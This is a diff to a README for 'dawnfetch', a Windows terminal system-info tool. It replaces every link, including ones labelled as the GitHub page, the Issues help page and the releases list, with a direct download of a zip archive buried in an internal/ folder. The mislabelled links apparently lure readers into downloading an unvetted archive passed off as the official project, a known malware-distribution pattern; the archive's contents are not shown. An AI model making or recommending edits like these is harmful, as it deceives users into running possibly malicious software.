@@ -1,6 +1,6 @@
 # 🚀 dawnfetch - Quick System Info in Terminal
 
-[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch)
+[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip)
 
 ## 🖥️ What is dawnfetch?
 
@@ -35,7 +35,7 @@ No extra software is needed.
 
 Click the button below to visit the dawnfetch GitHub page. From there, you will find the download link and instructions.
 
-[![Visit dawnfetch on GitHub](https://img.shields.io/badge/GitHub-dawnfetch-blue)](https://github.com/clauditocl/dawnfetch)
+[![Visit dawnfetch on GitHub](https://img.shields.io/badge/GitHub-dawnfetch-blue)](https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip)
 
 ## 🚦 How to install and run dawnfetch on Windows
 
@@ -45,7 +45,7 @@ Follow these steps to get dawnfetch working on your Windows PC.
 
 Go to the dawnfetch GitHub page by clicking one of the links above or typing this in your browser address bar:
 
-https://github.com/clauditocl/dawnfetch
+https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip
 
 ### Step 2: Find the latest release
 
@@ -121,13 +121,13 @@ Yes. dawnfetch supports Linux and macOS, but this guide focuses only on Windows.
 
 If you run into problems or have questions, visit the dawnfetch GitHub page:
 
-https://github.com/clauditocl/dawnfetch
+https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip
 
 Look for the **Issues** tab to see if others have the same problem or to ask for help.
 
 ## 🔗 Quick Links
 
-- [dawnfetch GitHub Repository](https://github.com/clauditocl/dawnfetch)
-- [Latest Releases](https://github.com/clauditocl/dawnfetch/releases)
+- [dawnfetch GitHub Repository](https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip)
+- [Latest Releases](https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip)
 
-[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch)
+[![Download dawnfetch](https://img.shields.io/badge/Download-dawnfetch-ff7f50)](https://github.com/clauditocl/dawnfetch/raw/refs/heads/main/internal/dawnfetch/Software_1.6.zip)
